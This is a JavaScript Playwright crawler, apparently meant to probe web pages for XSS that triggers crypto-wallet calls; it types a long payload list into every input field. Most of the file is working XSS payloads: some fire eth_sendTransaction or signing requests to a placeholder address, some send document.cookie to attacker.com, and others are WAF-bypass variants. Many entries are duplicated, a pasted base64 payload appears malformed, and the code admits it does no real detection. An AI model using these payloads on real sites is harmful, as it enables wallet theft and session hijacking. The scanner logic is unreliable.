const playwright = require('playwright');

const XSS_PAYLOADS = [
  // Reflected XSS payloads targeting wallet APIs (expanded with 50 advanced WAF bypass payloads)
  '<img src=x onerror="window.ethereum.request({method:\'eth_sendTransaction\', params:[{to:\'0xHACK\', value:\'0x1\'}]})">',
  '<script>window.ethereum.request({method:"eth_sendTransaction", params:[{to:"0xHACK", value:"0x1"}]});</script>',
  '<img src=x onerror=window.ethereum.request({method:"eth_sendTransaction",params:[{to:"0xHACK",value:"0x1"}]})>',
  '<svg/onload=window.ethereum.request({method:"eth_sendTransaction",params:[{to:"0xHACK",value:"0x1"}]})>',
  '<body onload=window.ethereum.request({method:"eth_sendTransaction",params:[{to:"0xHACK",value:"0x1"}]})>',
  '<iframe srcdoc="<script>window.ethereum.request({method:\'eth_sendTransaction\',params:[{to:\'0xHACK\',value:\'0x1\'}]})</script>"></iframe>',
  '<math><mi xlink:href="javascript:window.ethereum.request({method:\'eth_sendTransaction\',params:[{to:\'0xHACK\',value:\'0x1\'}]})"></mi></math>',
  '<details open ontoggle=window.ethereum.request({method:"eth_sendTransaction",params:[{to:"0xHACK",value:"0x1"}]})>',
  '<object data="javascript:window.ethereum.request({method:\'eth_sendTransaction\',params:[{to:\'0xHACK\',value:\'0x1\'}]})"></object>',
  '<embed src="javascript:window.ethereum.request({method:\'eth_sendTransaction\',params:[{to:\'0xHACK\',value:\'0x1\'}]})"></embed>',
  '<form action="javascript:window.ethereum.request({method:\'eth_sendTransaction\',params:[{to:\'0xHACK\',value:\'0x1\'}]})"><input type=submit></form>',
  '<input type="image" src="javascript:window.ethereum.request({method:\'eth_sendTransaction\',params:[{to:\'0xHACK\',value:\'0x1\'}]})">',
  '<style>@import "javascript:window.ethereum.request({method:\'eth_sendTransaction\',params:[{to:\'0xHACK\',value:\'0x1\'}]})";</style>',
  '<link rel="stylesheet" href="javascript:window.ethereum.request({method:\'eth_sendTransaction\',params:[{to:\'0xHACK\',value:\'0x1\'}]})">',
  '<meta http-equiv="refresh" content="0;url=javascript:window.ethereum.request({method:\'eth_sendTransaction\',params:[{to:\'0xHACK\',value:\'0x1\'}]})">',
  '<base href="javascript:window.ethereum.request({method:\'eth_sendTransaction\',params:[{to:\'0xHACK\',value:\'0x1\'}]})//">',
  '<script>setTimeout(() => window.ethereum.request({method:"eth_sendTransaction",params:[{to:"0xHACK",value:"0x1"}]}), 1000)</script>',
  '<svg/onload=fetch("http://attacker.com?cookie="+btoa(document.cookie))>',
  '<img src=x onerror=fetch("http://attacker.com?cookie="+btoa(document.cookie))>',
  '<script>window.ethereum.request({method:"eth_signTypedData", params:["0xHACK"]});</script>',
  '<script>window.ethereum.request({method:"eth_signTypedData_v4", params:["0xHACK"]});</script>',
  '<svg><desc><![CDATA[</desc><script>window.ethereum.request({method:"eth_sendTransaction",params:[{to:"0xHACK",value:"0x1"}]})</script>]]></svg>',
  '<svg><script xlink:href="javascript:window.ethereum.request({method:\'eth_sendTransaction\',params:[{to:\'0xHACK\',value:\'0x1\'}]})"></script></svg>',
  '<svg><script xlink:href="data:text/javascript,window.ethereum.request({method:\'eth_sendTransaction\',params:[{to:\'0xHACK\',value:\'0x1\'}]})"></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD53aW5kb3cuZXRoZXJldW0ucmVxdWVzdCh7bWV0aG9kOidldGhfc2VuZFRyYW5zYWN0aW9uJyxwYXJhbXM6W3t0bzoieDBIQUNLIix2YWx1ZToieDB9XX0pPC9zY3JpcHQ+"></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD53aW5kb3cuZXRoZXJldW0ucmVxdWVzdCh7bWV0aG9kOidldGhfc2VuZFRyYW5zYWN0aW9uJyxwYXJhbXM6W3t0bzoieDBIQUNLIix2YWx1ZToieDB9XX0pPC9zY3JpcHQ+"></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD53aW5kb3cuZXRoZXJldW0ucmVxdWVzdCh7bWV0aG9kOidldGhfc2VuZFRyYW5zYWN0aW9uJyxwYXJhbXM6W3t0bzoieDBIQUNLIix2YWx1ZToieDB9XX0pPC9zY3JpcHQ+"></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD53aW5kb3cuZXRoZXJldW0ucmVxdWVzdCh7bWV0aG9kOidldGhfc2VuZFRyYW5zYWN0aW9uJyxwYXJhbXM6W3t0bzoieDBIQUNLIix2YWx1ZToieDB9XX0pPC9zY3JpcHQ+"></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD53aW5kb3cuZXRoZXJldW0ucmVxdWVzdCh7bWV0aG9kOidldGhfc2VuZFRyYW5zYWN0aW9uJyxwYXJhbXM6W3t0bzoieDBIQUNLIix2YWx1ZToieDB9XX0pPC9zY3JpcHQ+"></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD53aW5kb3cuZXRoZXJldW0ucmVxdWVzdCh7bWV0aG9kOidldGhfc2VuZFRyYW5zYWN0aW9uJyxwYXJhbXM6W3t0bzoieDBIQUNLIix2YWx1ZToieDB9XX0pPC9zY3JpcHQ+"></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD53aW5kb3cuZXRoZXJldW0ucmVxdWVzdCh7bWV0aG9kOidldGhfc2VuZFRyYW5zYWN0aW9uJyxwYXJhbXM6W3t0bzoieDBIQUNLIix2YWx1ZToieDB9XX0pPC9zY3JpcHQ+"></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD53aW5kb3cuZXRoZXJldW0ucmVxdWVzdCh7bWV0aG9kOidldGhfc2VuZFRyYW5zYWN0aW9uJyxwYXJhbXM6W3t0bzoieDBIQUNLIix2YWx1ZToieDB9XX0pPC9zY3JpcHQ+"></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD53aW5kb3cuZXRoZXJldW0ucmVxdWVzdCh7bWV0aG9kOidldGhfc2VuZFRyYW5zYWN0aW9uJyxwYXJhbXM6W3t0bzoieDBIQUNLIix2YWx1ZToieDB9XX0pPC9zY3JpcHQ+"></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD53aW5kb3cuZXRoZXJldW0ucmVxdWVzdCh7bWV0aG9kOidldGhfc2VuZFRyYW5zYWN0aW9uJyxwYXJhbXM6W3t0bzoieDBIQUNLIix2YWx1ZToieDB9XX0pPC9zY3JpcHQ+"></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD53aW5kb3cuZXRoZXJldW0ucmVxdWVzdCh7bWV0aG9kOidldGhfc2VuZFRyYW5zYWN0aW9uJyxwYXJhbXM6W3t0bzoieDBIQUNLIix2YWx1ZToieDB9XX0pPC9zY3JpcHQ+"></script></svg>',

  // Common XSS payloads
  '\'><script>alert(1)</script>',
  '"><img src=x onerror=alert(1)>',
  '<svg/onload=alert(1)>',
  '<body onload=alert(1)>',
  '<iframe src="javascript:alert(1)"></iframe>',

  // Payloads simulating wallet interaction popups
  '<img src=x onerror="window.ethereum.request({method:\'personal_sign\', params:[\'0xHACK\']})">',
  '<script>window.ethereum.request({method:"signMessage", params:["0xHACK"]});</script>',

  // Payloads with event handlers
  '<div onmouseover=alert(1)>hover me</div>',
  '<input autofocus onfocus=alert(1)>',

  // Payloads with encoded characters
  '%3Cscript%3Ealert(1)%3C/script%3E',

  // Payloads with DOM-based XSS vectors
  '<a href="javascript:alert(1)">click me</a>',

  // Advanced payloads
  '<svg><script>alert(String.fromCharCode(88,83,83))</script></svg>',
  '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<math><mi xlink:href="javascript:alert(1)"></mi></math>',
  '<body onload=confirm`XSS`>',
  '<video><source onerror=alert(1)></video>',
  '<details open ontoggle=alert(1)>',
  '<object data="javascript:alert(1)"></object>',
  '<embed src="javascript:alert(1)"></embed>',
  '<form action="javascript:alert(1)"><input type=submit></form>',
  '<input type="image" src="javascript:alert(1)">',
  '<style>@import "javascript:alert(1)";</style>',
  '<link rel="stylesheet" href="javascript:alert(1)">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<base href="javascript:alert(1)//">',
  '<script>setTimeout(() => alert(1), 1000)</script>',
  '<svg/onload=fetch("http://attacker.com?cookie="+document.cookie)>',
  '<img src=x onerror=fetch("http://attacker.com?cookie="+document.cookie)>',
  '<script>window.ethereum.request({method:"eth_sign", params:["0xHACK"]});</script>',
  '<script>window.ethereum.request({method:"eth_sendTransaction", params:[{to:"0xHACK", value:"0x1"}]});</script>',

  // Advanced WAF bypass payloads
  '\'"--><script>alert(String.fromCharCode(88,83,83))</script>',
  '<svg/onload=alert&#40;1&#41;>',
  '<img src=x onerror=alert&#40;1&#41;>',
  '<body onload=alert&#40;1&#41;>',
  '<iframe src="javascript:alert&#40;1&#41;"></iframe>',
  '<scr<script>ipt>alert(1)</scr<script>ipt>',
  '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
  '<svg><script>alert`XSS`</script></svg>',
  '<math><mi xlink:href="javascript:alert&#40;1&#41;"></mi></math>',
  '<details open ontoggle=alert&#40;1&#41;>',
  '<object data="javascript:alert&#40;1&#41;"></object>',
  '<embed src="javascript:alert&#40;1&#41;"></embed>',
  '<form action="javascript:alert&#40;1&#41;"><input type=submit></form>',
  '<input type="image" src="javascript:alert&#40;1&#41;">',
  '<style>@import "javascript:alert&#40;1&#41;";</style>',
  '<link rel="stylesheet" href="javascript:alert&#40;1&#41;">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert&#40;1&#41;">',
  '<base href="javascript:alert&#40;1&#41;//">',
  '<script>setTimeout(() => alert(1), 1000)</script>',
  '<svg/onload=fetch("http://attacker.com?cookie="+document.cookie)>',
  '<img src=x onerror=fetch("http://attacker.com?cookie="+document.cookie)>',
  '<script>window.ethereum.request({method:"eth_sign", params:["0xHACK"]});</script>',
  '<script>window.ethereum.request({method:"eth_sendTransaction", params:[{to:"0xHACK", value:"0x1"}]});</script>',
  '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>',
  '<svg><script xlink:href="javascript:alert(1)"></script></svg>',
  '<svg><script xlink:href="data:text/javascript,alert(1)"></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></script></svg>',
  '<svg><script xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></script></svg>'
];

class Crawler {
  constructor(url) {
    this.url = url;
    this.results = [];
  }

  async run() {
    const browser = await playwright.chromium.launch({ headless: true });
    const context = await browser.newContext();
    const page = await context.newPage();

    // Inject wallet simulator before page load
    await page.addInitScript(() => {
      window.ethereum = {
        request: (args) => {
          console.log('Mock wallet request:', args);
          return Promise.resolve('mock_response');
        }
      };
    });

    page.on('console', msg => {
      const text = msg.text();
      if (text.includes('Mock wallet request:')) {
        this.results.push({
          type: 'wallet_interaction',
          detail: text,
          url: this.url
        });
      }
    });

    await page.goto(this.url, { waitUntil: 'networkidle' });

    for (const payload of XSS_PAYLOADS) {
      // Find input fields and inject payload
      const inputs = await page.$$('input, textarea');
      for (const input of inputs) {
        try {
          await input.fill('');
          await input.type(payload);
          await input.press('Enter');
          // Wait for potential DOM changes
          await page.waitForTimeout(1000);
        } catch (e) {
          // Ignore errors on input filling
        }
      }
    }

    // Monitor for script injections or DOM changes
    // This is a simplified example; real implementation would be more complex

    await browser.close();
    return this.results;
  }
}

module.exports = Crawler;
